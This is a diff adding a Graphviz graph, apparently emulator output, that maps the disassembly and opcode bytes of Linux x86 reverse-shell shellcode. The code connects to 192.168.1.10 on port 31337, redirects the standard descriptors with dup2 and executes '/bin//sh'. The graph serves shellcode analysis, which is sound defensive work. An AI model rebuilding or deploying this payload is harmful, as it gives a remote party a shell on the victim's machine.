@@ -1,0 +1,26 @@
+digraph G {
+	//rankdir=LR
+	node [fontname=Courier, labeljust=r];
+	 "0x55742c7cd5a0" [shape=box, label = "0x00417000 31C0                            xor eax,eax\l0x00417002 31DB                            xor ebx,ebx\l0x00417004 31C9                            xor ecx,ecx\l0x00417006 31D2                            xor edx,edx\l0x00417008 B066                            mov al,0x66\l0x0041700a B301                            mov bl,0x1\l0x0041700c 51                              push ecx\l0x0041700d 6A06                            push byte 0x6\l0x0041700f 6A01                            push byte 0x1\l0x00417011 6A02                            push byte 0x2\l0x00417013 89E1                            mov ecx,esp\l"]
+	 "0x55742c7c7160" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417015 socket\l"]
+	 "0x55742c7c6800" [shape=box, label = "0x00417017 89C6                            mov esi,eax\l0x00417019 B066                            mov al,0x66\l0x0041701b 31DB                            xor ebx,ebx\l0x0041701d B302                            mov bl,0x2\l0x0041701f 68C0A8010A                      push dword 0xa01a8c0\l0x00417024 66687A69                        push word 0x697a\l0x00417028 6653                            push bx\l0x0041702a FEC3                            inc bl\l0x0041702c 89E1                            mov ecx,esp\l0x0041702e 6A10                            push byte 0x10\l0x00417030 51                              push ecx\l0x00417031 56                              push esi\l0x00417032 89E1                            mov ecx,esp\l"]
+	 "0x55742c7d3220" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417034 connect\l"]
+	 "0x55742c7d3350" [shape=box, label = "0x00417036 31C9                            xor ecx,ecx\l0x00417038 B103                            mov cl,0x3\l"]
+	 "0x55742c7d3640" [shape=box, label = "0x0041703a FEC9                            dec cl\l"]
+	 "0x55742c7d37b0" [shape=box, label = "0x0041703c B03F                            mov al,0x3f\l"]
+	 "0x55742c7d3930" [shape=box, style=filled, color=".7 .3 1.0", label = "0x0041703e dup2\l"]
+	 "0x55742c7d3a60" [shape=box, label = "0x00417040 75                              jnz 0x1\l"]
+	 "0x55742c7d3bd0" [shape=box, label = "0x00417042 31C0                            xor eax,eax\l0x00417044 52                              push edx\l0x00417045 686E2F7368                      push dword 0x68732f6e\l0x0041704a 682F2F6269                      push dword 0x69622f2f\l0x0041704f 89E3                            mov ebx,esp\l0x00417051 52                              push edx\l0x00417052 53                              push ebx\l0x00417053 89E1                            mov ecx,esp\l0x00417055 52                              push edx\l0x00417056 89E2                            mov edx,esp\l0x00417058 B00B                            mov al,0xb\l"]
+	 "0x55742c7d4d80" [shape=box, style=filled, color=".7 .3 1.0", label = "0x0041705a execve\l"]
+	 "0x55742c7cd5a0" -> "0x55742c7c7160" [style = bold ]
+	 "0x55742c7c7160" -> "0x55742c7c6800" [style = bold ]
+	 "0x55742c7c6800" -> "0x55742c7d3220" [style = bold ]
+	 "0x55742c7d3220" -> "0x55742c7d3350" [style = bold ]
+	 "0x55742c7d3350" -> "0x55742c7d3640" [style = bold ]
+	 "0x55742c7d3640" -> "0x55742c7d37b0" [style = bold, color=orange ]
+	 "0x55742c7d37b0" -> "0x55742c7d3930" [style = bold, color=orange ]
+	 "0x55742c7d3930" -> "0x55742c7d3a60" [style = bold, color=orange ]
+	 "0x55742c7d3a60" -> "0x55742c7d3640" [style = bold, color=orange ]
+	 "0x55742c7d3a60" -> "0x55742c7d3bd0" [style = bold ]
+	 "0x55742c7d3bd0" -> "0x55742c7d4d80" [style = bold ]
+}
